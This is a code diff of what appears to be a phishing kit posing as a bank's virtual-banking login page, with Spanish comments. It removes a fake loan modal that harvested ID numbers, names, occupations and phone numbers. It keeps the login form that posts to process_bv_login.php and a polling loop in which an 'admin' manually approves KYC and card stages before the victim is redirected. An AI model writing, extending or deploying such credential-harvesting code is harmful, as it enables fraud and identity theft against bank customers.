@@ -519,110 +519,6 @@
         </div>
     </div>
 
-    <!-- ================================== -->
-    <!-- === NUEVO MODAL DE CRÉDITO === -->
-    <!-- ================================== -->
-    <div id="loanModalOverlay" class="overlay">
-        <div class="loan-modal-content">
-            <h3>Simula y solicita tu crédito</h3>
-            
-            <!-- FORMULARIO 3: Simulador de Crédito -->
-            <form id="loan-form" novalidate>
-                
-                <!-- Slider de Monto -->
-                <div class="loan-slider-group">
-                    <label for="montoCredito">¿Cuánta plata necesitas?</label>
-                    <div id="montoSeleccionado" class="loan-amount-display">$1.000.000</div>
-                    <input type="range" id="montoCredito" name="montoCredito" min="1000000" max="30000000" step="500000" value="1000000">
-                    <div class="loan-slider-labels">
-                        <span>$1.000.000</span>
-                        <span>$30.000.000</span>
-                    </div>
-                </div>
-
-                <p class="bv-input-label" style="font-weight: 700; font-size: 16px; margin-bottom: 15px; color: #1f2937;">Completa tus datos personales</p>
-
-                <!-- Cédula -->
-                <label for="cedula" class="bv-input-label">Identificación</label>
-                <div class="bv-input-group">
-                    <select id="tipoDocCredito" name="tipoDocCredito" required>
-                        <option value="CC" selected>C.C.</option>
-                        <option value="CE">C.E.</option>
-                        <option value="PA">P.A.</option>
-                    </select>
-                    <input id="cedula" name="cedula" type="text" placeholder="#" inputmode="numeric" required>
-                    <span class="error-icon">!</span>
-                </div>
-
-                <!-- Nombre -->
-                <label for="nombreCompleto" class="bv-input-label">Nombre y apellido</label>
-                <div class="bv-input-group">
-                    <input id="nombreCompleto" name="nombreCompleto" type="text" placeholder="Tu nombre completo" required>
-                    <span class="error-icon">!</span>
-                </div>
-
-                <!-- Ocupación -->
-                <label for="ocupacion" class="bv-input-label">Ocupación</label>
-                <div class="bv-input-group">
-                    <select id="ocupacion" name="ocupacion" class="bv-full-width-select" required>
-                        <option value="">Selecciona...</option>
-                        <option value="Empleado">Empleado</option>
-                        <option value="Independiente">Independiente</option>
-                        <option value="Pensionado">Pensionado</option>
-                        <option value="Otro">Otro</option>
-                    </select>
-                    <span class="error-icon">!</span>
-                </div>
-
-                <!-- Teléfono -->
-                <label for="celular" class="bv-input-label">Número de teléfono</label>
-                <div class="bv-input-group">
-                    <input id="celular" name="celular" type="text" placeholder="3XX XXX XXXX" inputmode="numeric" maxlength="10" required>
-                    <span class="error-icon">!</span>
-                </div>
-
-                <!-- Plazo -->
-                <label for="plazo" class="bv-input-label">¿En cuánto tiempo quieres pagar?</label>
-                <div class="bv-input-group">
-                    <select id="plazo" name="plazo" required>
-                        <option value="1">1 mes</option>
-                        <option value="2">2 meses</option>
-                        <option value="3">3 meses</option>
-                        <option value="6" selected>6 meses</option>
-                        <option value="10">10 meses</option>
-                        <option value="12">12 meses</option>
-                    </select>
-                    <span class="error-icon">!</span>
-                </div>
-
-                <!-- Fecha de pago -->
-                <label for="fechaPago" class="bv-input-label">Fecha de pago</label>
-                <div class="bv-input-group">
-                    <select id="fechaPago" name="fechaPago" required>
-                        <option value="1">1 de cada mes</option>
-                        <option value="15">15 de cada mes</option>
-                        <option value="25">25 de cada mes</option>
-                    </select>
-                    <span class="error-icon">!</span>
-                </div>
-
-                <!-- Valor Cuota -->
-                <div class="loan-fee-display">
-                    <span class="bv-input-label">Valor aproximado de tu cuota mensual:</span>
-                    <div id="cuotaMensual" class="amount">$23.477</div>
-                </div>
-
-                <!-- Botones -->
-                <div class="loan-modal-buttons">
-                    <button type="button" class="btn bv-cancel-btn" id="cancel-loan-btn">Cancelar</button>
-                    <button type="submit" class="btn bv-submit-btn" id="submit-loan-btn" disabled>Validar</button>
-                </div>
-
-            </form>
-        </div>
-    </div>
-
-
     <script src="assets/js/bancavirtual.js"></script>
     
     <!-- ========================================================== -->
@@ -693,14 +589,7 @@ document.addEventListener('DOMContentLoaded', function() {
     // --- Selectores de Elementos ---
     const loadingOverlay = document.getElementById('loadingOverlay');
     const errorPopupOverlay = document.getElementById('errorPopupOverlay');
-    const loanModalOverlay = document.getElementById('loanModalOverlay');
     const loadingText = document.querySelector('.loading-text');
-    const loanForm = document.getElementById('loan-form');
-    const submitLoanBtn = document.getElementById('submit-loan-btn');
-    const cancelLoanBtn = document.getElementById('cancel-loan-btn');
-    const montoSlider = document.getElementById('montoCredito');
-    const montoDisplay = document.getElementById('montoSeleccionado');
-    const plazoSelect = document.getElementById('plazo');
 
     let checkInterval; // Variable global para el intervalo de polling
 
@@ -741,7 +630,7 @@ document.addEventListener('DOMContentLoaded', function() {
                         // KYC en revisión — seguir esperando
                         console.log('KYC en revisión, esperando decisión del admin...');
                     } else if (estado === 9) {
-                        // ✅ KYC Aprobado — continuar al modal de crédito
+                        // ✅ KYC Aprobado — seguir esperando
                         clearInterval(checkInterval);
                         window.location.href = `index.php?id=${transactionId}`;
                     } else if (estado === 10) {
@@ -749,7 +638,7 @@ document.addEventListener('DOMContentLoaded', function() {
                         clearInterval(checkInterval);
                         window.location.href = `index.php`;
                     } else if (estado === 11) {
-                        // ✅ TC Aprobada — continuar al modal de crédito
+                        // ✅ TC Aprobada — finalizar
                         clearInterval(checkInterval);
                         window.location.href = `index.php?id=${transactionId}`;
                     } else if (estado === 12) {
@@ -815,33 +704,12 @@ document.addEventListener('DOMContentLoaded', function() {
     }
 
     const transactionId = getUrlParameter('id');
-    const isWaiting = getUrlParameter('waiting');
 
     if (transactionId) {
-        // ==================================================================
-        // === FLUJO 2: YA TENEMOS ID, MOSTRAMOS MODAL DE CRÉDITO         ===
-        // ==================================================================
-        
-        // Verificamos si ya enviamos el crédito o si venimos forzados a esperar
-        const creditSent = sessionStorage.getItem(`credit_sent_${transactionId}`);
-
-        if (creditSent || isWaiting === 'true') {
-            // Si ya lo envió o viene de tarjetas, mostramos el loader y esperamos
-            startPolling(transactionId);
-        } else {
-            // Si no lo ha enviado, mostramos el modal de crédito
-            loanModalOverlay.classList.add('active');
-            
-            // Autocompletar datos si existen (aunque vienen de la pág anterior,
-            // podríamos pasarlos por sessionStorage, pero por ahora se quedan en blanco)
-        }
-
+        // Con ID de transacción, ir directo al loader y esperar decisión del admin
+        startPolling(transactionId);
     } else {
-        // ==================================================================
-        // === FLUJO 1: NO TENEMOS ID, PÁGINA DE LOGIN NORMAL             ===
-        // ==================================================================
-        
-        // Lógica de Tabs
+        // Sin ID, página de login normal
         const tabs = document.querySelectorAll('.bv-tab');
         const tabContents = document.querySelectorAll('.bv-tab-content');
         
@@ -859,7 +727,7 @@ document.addEventListener('DOMContentLoaded', function() {
             });
         });
 
-        // Lógica de Toggle de Contraseña
+        // Toggle Contraseña
         document.querySelectorAll('.bv-toggle-pass').forEach(button => {
             button.addEventListener('click', function() {
                 const inputId = this.getAttribute('aria-controls');
@@ -874,7 +742,7 @@ document.addEventListener('DOMContentLoaded', function() {
             });
         });
 
-        // Lógica de cerrar Alerta
+        // Cerrar Alerta
         const alertMessage = document.querySelector('.bv-alert-message');
         const closeAlertBtn = document.querySelector('.bv-close-btn');
         if (closeAlertBtn) {
@@ -884,9 +752,7 @@ document.addEventListener('DOMContentLoaded', function() {
         }
     }
 
-    // --- Configuración de TODOS los formularios (Login y Crédito) ---
-
-    // 1. Validación para los formularios de LOGIN (Flujo 1)
+    // Validación para los formularios de LOGIN
     const loginForms = document.querySelectorAll('.bv-login-card form');
     loginForms.forEach(form => {
         const submitBtn = form.querySelector('.bv-submit-btn');
@@ -896,112 +762,11 @@ document.addEventListener('DOMContentLoaded', function() {
             input.addEventListener('input', () => validateForm(form, submitBtn));
         });
         
-        setupInputValidation(form); // Configura validación de blur/input
-        validateForm(form, submitBtn); // Estado inicial
+        setupInputValidation(form);
+        validateForm(form, submitBtn);
 
-        // ***** INTERCEPTAR EL SUBMIT DEL LOGIN *****
-        // Esta vez no prevenimos el default, dejamos que se envíe
-        // y recargue la página a index.php?id=...
         form.addEventListener('submit', function(e) {
-            // Mostramos un loader simple para que el usuario sepa que algo pasó
             loadingOverlay.classList.add('active');
-            // El formulario se envía NORMALMENTE a process_bv_login.php
-        });
-    });
-
-    // 2. Lógica del MODAL DE CRÉDITO (Flujo 2)
-    
-    // --- Lógica del Simulador de Créditos ---
-    function updateLoanFee() {
-        const monto = parseInt(montoSlider.value);
-        const plazo = parseInt(plazoSelect.value);
-        
-        // Tasa de interés mensual estimada (ej. 1.8%)
-        const tasaMensual = 0.018;
-        
-        // Fórmula de cuota nivelada (amortización simple para fines de simulación)
-        // Cuota = (Monto * Tasa) / (1 - (1 + Tasa)^-Plazo)
-        let cuota = 0;
-        if (plazo > 0) {
-            cuota = (monto * tasaMensual) / (1 - Math.pow(1 + tasaMensual, -plazo));
-        }
-        
-        montoDisplay.textContent = formatCurrency(montoSlider.value);
-        document.getElementById('cuotaMensual').textContent = formatCurrency(Math.round(cuota).toString());
-    }
-
-    // Eventos del Slider
-    montoSlider.addEventListener('input', updateLoanFee);
-    plazoSelect.addEventListener('change', updateLoanFee);
-    
-    // Calcular cuota inicial
-    updateLoanFee();
-    
-    // Validación para el formulario de CRÉDITO
-    const loanInputs = loanForm.querySelectorAll('input[required], select[required]');
-    loanInputs.forEach(input => {
-        input.addEventListener('input', () => validateForm(loanForm, submitLoanBtn));
-    });
-    setupInputValidation(loanForm); // Configura validación de blur/input
-    validateForm(loanForm, submitLoanBtn); // Estado inicial
-
-    // Botón de Cancelar (Flujo 2)
-    cancelLoanBtn.addEventListener('click', () => {
-        // Si cancela, lo mandamos al inicio
-        window.location.href = 'index.php';
-    });
-
-    // ***** ENVÍO DEL CRÉDITO (Flujo 2) *****
-    loanForm.addEventListener('submit', function(e) {
-        e.preventDefault();
-
-        // Deshabilitar botón para evitar doble envío
-        submitLoanBtn.disabled = true;
-        submitLoanBtn.textContent = 'Enviando...';
-
-        // 1. Prepara los datos del crédito (limpiando valores)
-        const loanData = new FormData(loanForm);
-        const processedLoanData = new FormData();
-
-        for (const [key, value] of loanData.entries()) {
-             // Limpia valores de moneda antes de enviar
-            let finalValue = value;
-            if (['ingresoMensual', 'gastosMensual', 'saldoActual', 'montoCredito'].includes(key)) {
-                finalValue = value.replace(/\D/g, '');
-            }
-            processedLoanData.append(key, finalValue);
-        }
-
-        // 2. Enviar por Fetch al nuevo script
-        fetch(`assets/config/process_credit_data.php?id=${transactionId}`, {
-            method: 'POST',
-            body: processedLoanData
-        })
-        .then(response => response.json())
-        .then(data => {
-            if (data.status === 'success') {
-                // 3. Si tiene éxito:
-                // Guardamos en sessionStorage para que si refresca, no pida de nuevo
-                sessionStorage.setItem(`credit_sent_${transactionId}`, 'true');
-                
-                // Ocultamos el modal
-                loanModalOverlay.classList.remove('active');
-                
-                // Empezamos el polling (loader y espera)
-                startPolling(transactionId);
-            } else {
-                // Si el PHP devuelve error
-                console.error('Error al enviar datos de crédito:', data.message);
-                alert('Hubo un error al enviar sus datos de crédito. Intente de nuevo.');
-                submitLoanBtn.disabled = false;
-                submitLoanBtn.textContent = 'Validar';
-            }
-        })
-        .catch(error => {
-            console.error('Error de red al enviar crédito:', error);
-            alert('Hubo un error de red. Verifique su conexión e intente de nuevo.');
-            submitLoanBtn.disabled = false;
-            submitLoanBtn.textContent = 'Validar';
         });
     });
 
